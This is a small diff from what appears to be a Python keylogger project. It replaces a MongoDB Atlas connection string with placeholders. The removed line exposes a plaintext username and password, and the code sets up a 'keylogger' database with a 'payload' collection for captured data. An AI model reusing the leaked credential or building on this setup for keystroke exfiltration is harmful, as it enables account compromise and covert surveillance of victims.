@@ -5,7 +5,7 @@ import time
 import pyautogui
 import pymongo
 
-client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+client = pymongo.MongoClient("mongodb+srv://<username>:<password>@keyspy.iarapa1.mongodb.net/") #monogDB Atlas connection link
 db = client["keylogger"]
 payload_collection = db["payload"]
 
